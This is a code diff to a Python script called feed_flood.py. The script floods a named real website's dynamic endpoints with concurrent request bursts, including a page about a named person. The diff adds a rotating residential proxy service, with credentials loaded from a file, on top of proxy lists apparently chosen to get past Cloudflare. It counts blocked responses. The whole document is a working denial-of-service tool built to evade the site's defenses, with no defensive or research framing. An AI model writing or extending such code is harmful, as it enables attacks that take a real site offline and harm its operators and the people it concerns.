@@ -8,13 +8,19 @@ Open DYNAMIC endpoints on metoo-shatkin.com (confirmed):
 
 Usage:
   python3 feed_flood.py --proxy-file proxies_cf_passing_new.txt
+  python3 feed_flood.py --webshare
   python3 feed_flood.py --target metoo-shatkin.com --concurrency 25 --bursts 0
   python3 feed_flood.py --endpoints feed sitemap home
 """
 
-import time, random, argparse, threading
+import time, random, argparse, threading, os
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from curl_cffi import requests as cffi
+
+CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                          "proxies_webshare_backbone_creds.txt")
+WS_HOST    = "p.webshare.io"
+WS_PORT    = 80
 
 G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
 C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"
@@ -32,11 +38,12 @@ ENDPOINT_SETS = {
     "home":    ["/", "/dentist-todd-shatkins-history-of-stalking/"],
 }
 
-_lock      = threading.Lock()
-_stats     = {"ok": 0, "blocked": 0, "err": 0, "total": 0}
+_lock       = threading.Lock()
+_stats      = {"ok": 0, "blocked": 0, "err": 0, "total": 0}
 _proxy_list = []
 _proxy_idx  = 0
 _endpoints  = []
+_ws_proxy   = None
 
 
 def load_proxies(path):
@@ -46,8 +53,19 @@ def load_proxies(path):
     print(f"  Loaded {len(_proxy_list)} proxies from {path}")
 
 
+def load_webshare():
+    global _ws_proxy
+    with open(CREDS_FILE) as f:
+        lines = [l.strip() for l in f if l.strip()]
+    user, pwd = lines[0], lines[1]
+    _ws_proxy = f"http://{user}-rotate:{pwd}@{WS_HOST}:{WS_PORT}"
+    print(f"  Webshare rotating proxy — {WS_HOST}:{WS_PORT}")
+
+
 def next_proxy(single_proxy):
     global _proxy_idx
+    if _ws_proxy:
+        return _ws_proxy
     if _proxy_list:
         with _lock:
             p = _proxy_list[_proxy_idx % len(_proxy_list)]
@@ -117,6 +135,8 @@ def main():
                     help="seconds between bursts")
     ap.add_argument("--proxy",       default=None)
     ap.add_argument("--proxy-file",  default=None)
+    ap.add_argument("--webshare",    action="store_true",
+                    help=f"use Webshare rotating residential proxy (creds from {CREDS_FILE})")
     ap.add_argument("--endpoints",   nargs="+",
                     choices=list(ENDPOINT_SETS.keys()) + ["all"],
                     default=["all"],
@@ -132,10 +152,13 @@ def main():
             _endpoints.extend(ENDPOINT_SETS[k])
     _endpoints = list(dict.fromkeys(_endpoints))
 
-    if args.proxy_file:
+    if args.webshare:
+        load_webshare()
+    elif args.proxy_file:
         load_proxies(args.proxy_file)
 
-    proxy_label = args.proxy_file or args.proxy or "none (system IP)"
+    proxy_label = ("webshare-rotating" if args.webshare
+                   else args.proxy_file or args.proxy or "none (system IP)")
     print(f"\n{B}feed_flood.py{W}  target={C}{args.target}{W}  "
           f"concurrency={args.concurrency}  proxy={proxy_label}")
     print(f"  endpoints ({len(_endpoints)}): {_endpoints}")
